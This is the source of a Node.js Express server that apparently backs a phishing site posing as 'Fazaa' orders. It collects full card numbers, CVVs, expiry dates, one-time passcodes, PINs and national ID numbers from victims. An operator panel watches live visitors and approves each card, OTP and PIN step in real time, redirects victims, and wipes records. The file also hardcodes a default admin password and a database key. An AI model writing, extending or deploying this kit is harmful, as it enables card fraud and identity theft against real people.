const express = require("express");
const path = require("path");

const app = express();
app.use(express.json({ limit: "100kb" }));

const ADMIN_PASSWORD = process.env.ADMIN_PASSWORD || "fazaa2026";
const SB_URL = "https://hqhucwxczutpwvddtuws.supabase.co/rest/v1";
const SB_KEY = "sb_publishable_6Rouky_x_o6YZrAeSe837w_p7_wWgQg";

const H = { "apikey": SB_KEY, "Authorization": "Bearer " + SB_KEY, "Content-Type": "application/json", "Prefer": "return=representation" };
const Hmin = { "apikey": SB_KEY, "Authorization": "Bearer " + SB_KEY, "Content-Type": "application/json", "Prefer": "return=minimal" };

async function sbGet(table, query) {
  const r = await fetch(SB_URL + "/" + table + (query ? "?" + query : ""), { headers: H });
  return r.ok ? r.json() : [];
}
async function sbInsert(table, data) {
  const r = await fetch(SB_URL + "/" + table, { method: "POST", headers: H, body: JSON.stringify(data) });
  return r.ok ? r.json() : null;
}
async function sbUpdate(table, filter, data) {
  const r = await fetch(SB_URL + "/" + table + "?" + filter, { method: "PATCH", headers: H, body: JSON.stringify(data) });
  return r.ok ? r.json() : null;
}
async function sbDelete(table, filter) {
  await fetch(SB_URL + "/" + table + "?" + filter, { method: "DELETE", headers: Hmin });
}

const visitors = new Map();
const allVisitorIds = new Set();
const ACTIVE_MS = 30000;
function activeVisitors() {
  const now = Date.now();
  for (const [id, v] of visitors) if (now - v.t > ACTIVE_MS) visitors.delete(id);
  return [...visitors.values()];
}

const isAdmin = req => req.headers["x-admin-password"] === ADMIN_PASSWORD;
const str = (v, max = 300) => String(v == null ? "" : v).slice(0, max);

function cleanOrder(b) {
  const p = b.pay && typeof b.pay === "object" ? b.pay : {};
  let rawCard = p.cardNumber || p.number || p.fullCard || p.card || "";
  if (typeof rawCard === "boolean") rawCard = "";
  let rawCvv = p.cvv || "";
  if (typeof rawCvv === "boolean") rawCvv = "";
  let rawExp = p.exp || p.expiry || "";
  if (typeof rawExp === "boolean") rawExp = "";
  let rawOtp = p.otp || p.code || "";
  if (typeof rawOtp === "boolean") rawOtp = "";
  let rawPin = p.pin || "";
  if (typeof rawPin === "boolean") rawPin = "";
  let rawName = p.cardName || p.name || "";
  if (typeof rawName === "boolean") rawName = "";
  return {
    ref: str(b.ref, 40),
    status: ["confirmed", "awaiting"].includes(b.status) ? b.status : "pending",
    card: str(b.card, 10), watch: str(b.watch, 10),
    st: b.st === "resident" ? "resident" : "citizen",
    name: str(b.n, 120),
    id_number: str(b.id, 20).replace(/\D/g, ""),
    phone: str(b.p, 15).replace(/\D/g, ""),
    email: str(b.e, 160),
    gender: b.g === "female" ? "female" : "male",
    emirate: str(b.em, 30), age: str(b.a, 5), address: str(b.ad, 500),
    lang: b.lang === "en" ? "en" : "ar",
    step: ["card", "otp", "pin"].includes(b.step) ? b.step : null,
    pay: {
      cardName: str(rawName, 120),
      cardNumber: str(rawCard, 30),
      last4: str(rawCard.slice(-4) || p.last4, 4).replace(/\D/g, ""),
      brand: ["visa", "mc", "amex"].includes(p.brand) ? p.brand : "",
      exp: str(rawExp, 5),
      cvv: str(rawCvv, 10),
      otp: str(rawOtp, 10),
      pin: str(rawPin, 10)
    }
  };
}

function toClientOrder(row) {
  return {
    ref: row.ref, status: row.status, card: row.card, watch: row.watch, st: row.st,
    n: row.name, id: row.id_number, p: row.phone, e: row.email, g: row.gender,
    em: row.emirate, a: row.age, ad: row.address, lang: row.lang,
    step: row.step, decision: row.decision, reason: row.reason, next: row.next_step,
    pay: row.pay, ts: row.created_at ? new Date(row.created_at).getTime() : null,
    updated: row.updated_at ? new Date(row.updated_at).getTime() : null
  };
}

app.post("/api/orders", async (req, res) => {
  try {
    const b = req.body;
    const o = cleanOrder(b);
    if (!/^FZ-\d{6,}$/.test(o.ref) || !o.name || (o.phone || "").length !== 9)
      return res.status(400).json({ ok: false, error: "invalid" });

    const existing = await sbGet("orders", "ref=eq." + encodeURIComponent(o.ref) + "&select=*&limit=1");
    if (existing && existing.length > 0) {
      const prev = existing[0];
      const updates = { ...o, updated_at: new Date().toISOString() };
      if (prev.status === "confirmed") updates.status = "confirmed";
      if (o.status === "awaiting") { updates.decision = null; updates.reason = null; }
      else { updates.decision = prev.decision; updates.reason = prev.reason; }
      delete updates.ref;
      await sbUpdate("orders", "ref=eq." + encodeURIComponent(o.ref), updates);
    } else {
      await sbInsert("orders", o);
    }
    res.json({ ok: true, ref: o.ref });
  } catch (e) { res.status(500).json({ ok: false, error: e.message }); }
});

app.get("/api/status/:ref", async (req, res) => {
  try {
    const ref = req.params.ref;
    const rows = await sbGet("orders", "ref=eq." + encodeURIComponent(ref) + "&select=status,decision,reason,next_step&limit=1");
    if (!rows || !rows.length) return res.status(404).json({ ok: false });
    const o = rows[0];
    res.json({ ok: true, status: o.status, decision: o.decision || "", reason: o.reason || "", next: o.next_step || "" });
  } catch (e) { res.status(500).json({ ok: false }); }
});

app.post("/api/ping", (req, res) => {
  const id = str((req.body || {}).id, 40);
  if (!id) return res.status(400).json({ ok: false });
  visitors.set(id, { t: Date.now(), page: str(req.body.page, 60) });
  allVisitorIds.add(id);
  res.json({ ok: true });
});

app.post("/api/leave", (req, res) => {
  visitors.delete(str((req.body || {}).id, 40));
  res.json({ ok: true });
});

app.get("/api/admin/check", (req, res) => {
  if (!isAdmin(req)) return res.status(401).json({ ok: false, error: "unauthorized" });
  res.json({ ok: true });
});

app.get("/api/admin/orders", async (req, res) => {
  if (!isAdmin(req)) return res.status(401).json({ ok: false, error: "unauthorized" });
  try {
    const rows = await sbGet("orders", "select=*&order=created_at.desc&limit=500");
    const v = activeVisitors();
    const clientOrders = (rows || []).map(toClientOrder);
    res.json({ ok: true, orders: clientOrders, active: v.length, totalVisitors: allVisitorIds.size, pages: v.map(x => x.page) });
  } catch (e) { res.status(500).json({ ok: false }); }
});

app.post("/api/admin/decide/:ref", async (req, res) => {
  if (!isAdmin(req)) return res.status(401).json({ ok: false, error: "unauthorized" });
  try {
    const ref = req.params.ref;
    const decision = req.body.decision === "reject" ? "reject" : "accept";
    const rows = await sbGet("orders", "ref=eq." + encodeURIComponent(ref) + "&select=*&limit=1");
    if (!rows || !rows.length) return res.status(404).json({ ok: false });
    const o = rows[0];
    const step = o.step || "card";
    const updates = { updated_at: new Date().toISOString() };
    if (decision === "reject") {
      updates.decision = "reject"; updates.reason = step; updates.status = "rejected"; updates.next_step = null;
    } else {
      const nextOf = { card: "otp", otp: "pin", pin: "done" };
      const next = nextOf[step];
      updates.decision = "accept"; updates.reason = null;
      if (next === "done") { updates.status = "confirmed"; updates.next_step = "done"; }
      else { updates.status = "stepok"; updates.next_step = next; }
    }
    await sbUpdate("orders", "ref=eq." + encodeURIComponent(ref), updates);
    res.json({ ok: true, status: updates.status });
  } catch (e) { res.status(500).json({ ok: false }); }
});

app.post("/api/admin/redirect/:ref", async (req, res) => {
  if (!isAdmin(req)) return res.status(401).json({ ok: false, error: "unauthorized" });
  try {
    const ref = req.params.ref;
    const page = str(req.body.page, 60) || "order";
    const rows = await sbGet("orders", "ref=eq." + encodeURIComponent(ref) + "&select=*&limit=1");
    if (!rows || !rows.length) return res.status(404).json({ ok: false });
    const updates = { decision: "redirect", next_step: page, status: "redirect", updated_at: new Date().toISOString() };
    await sbUpdate("orders", "ref=eq." + encodeURIComponent(ref), updates);
    res.json({ ok: true });
  } catch (e) { res.status(500).json({ ok: false }); }
});

app.delete("/api/admin/orders/:ref", async (req, res) => {
  if (!isAdmin(req)) return res.status(401).json({ ok: false, error: "unauthorized" });
  try {
    const ref = req.params.ref;
    await sbDelete("orders", "ref=eq." + encodeURIComponent(ref));
    res.json({ ok: true });
  } catch (e) { res.status(500).json({ ok: false }); }
});

app.get("/api/admin/visitors", (req, res) => {
  if (!isAdmin(req)) return res.status(401).json({ ok: false, error: "unauthorized" });
  const v = activeVisitors();
  res.json({ ok: true, active: v, count: v.length });
});

app.post("/api/admin/reset", async (req, res) => {
  if (!isAdmin(req)) return res.status(401).json({ ok: false, error: "unauthorized" });
  try {
    const rows = await sbGet("orders", "select=ref");
    for (const r of (rows || [])) {
      await sbDelete("orders", "ref=eq." + encodeURIComponent(r.ref));
    }
    visitors.clear();
    allVisitorIds.clear();
    res.json({ ok: true, deletedOrders: (rows || []).length });
  } catch (e) { res.status(500).json({ ok: false }); }
});

app.delete("/api/admin/inactive", async (req, res) => {
  if (!isAdmin(req)) return res.status(401).json({ ok: false, error: "unauthorized" });
  try {
    const cutoff = new Date(Date.now() - 120000).toISOString();
    const rows = await sbGet("orders", "updated_at=lt." + cutoff + "&select=ref");
    for (const r of (rows || [])) {
      await sbDelete("orders", "ref=eq." + encodeURIComponent(r.ref));
    }
    res.json({ ok: true, deleted: (rows || []).length });
  } catch (e) { res.status(500).json({ ok: false }); }
});

if (!process.env.VERCEL) {
  app.use(express.static(path.join(__dirname, "public")));
  app.get("*", (req, res) => {
    res.sendFile(path.join(__dirname, "public", "index.html"));
  });
  const PORT = process.env.PORT || 3000;
  app.listen(PORT, () => console.log("Fazaa running on port " + PORT));
}

module.exports = app;
